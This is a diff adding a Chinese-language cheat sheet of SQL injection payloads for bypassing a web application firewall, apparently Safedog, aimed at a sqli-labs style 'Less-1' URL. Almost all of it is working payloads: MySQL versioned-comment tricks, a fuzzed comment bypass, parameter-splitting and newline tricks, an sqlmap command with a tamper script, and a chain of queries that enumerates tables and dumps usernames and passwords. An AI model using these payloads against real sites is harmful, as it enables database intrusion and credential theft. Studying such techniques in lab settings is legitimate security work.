@@ -1,0 +1,39 @@
+http://www.sqli.com/Less-1/?id=1
+/*!num*/
+这个数字是五位数字
+如果当前数据库版本大于这串数字，此时/*!后面的内容不再被当做注释，否则任然被当做注释
+
+/*!99999hello*/  union /*!99999hello*/  select 1,2,user/*!99999hello*/ ()-- +
+
+
+/*!44532union*/ /*!44532select */ 1,2,user/*!99999hello*/ ()-- +
+
+双写绕过
+/*!44532union /*!44532select */ 1,2,user/*!99999hello*/ ()-- +
+
+/*!44532union /*!44532select */ 1,2,user/*!99999hello*/ ()-- +
+
+/*%!a*/ 通过fuzz尝试出来的 
+
+union/*%!a*/select 1,2,user/*%!a*/() --+
+
+http://www.sqli.com/Less-1/?id=1 union/*%!a*/select 1,2,user/*%!a*/() --+
+
+终极杀招
+http://www.sqli.com/Less-1/?a=/*&id=-1' union select 1,2,user() --+&b=*/
+
+使用注释换行
+http://www.sqli.com/Less-1/?a=/*&id=-1' union select 1,2,user%20%23%0a() --+&b=*/
+
+使用tamper脚本绕过
+python sqlmap.py -u "http://www.sqli.com/Less-1/?id=1" --tamper=safedog.py --random-agent -v 3 --purge
+
+1'/**//*!00440order by 2*//**/#
+1'/**//*!00440union*//**//*!00440select 1,2*/#
+1'/**//*!00440union*//**//*!00440select*//**/1,user/*!00044*/()/**/#
+1'/**//*!00440union*//**//*!00440select 1,@@basedir*/#
+1'/**//*!00440union*//**//*!00440select 1,2,table_name from information_schema.tables where table_schema=*/database/*!00044*/()/**/#
+1'/**//*!00440union*//**//*!00440select 1,table_name from information_schema.tables where table_schema=*/database/*!00044*/()/**/limit/**/1/**/#
+1'/**//*!00440union*//**//*!00440select 1,concat(table_name) from information_schema.tables where table_schema=*/database/*!00044*/()/**/#
+1'/**//*!00440union*//**//*!00440select 1,column_name from information_schema.columns where table_name='users'*//**/#
+1'/**//*!00440union*//**//*!00440select user,password from users*//**/#
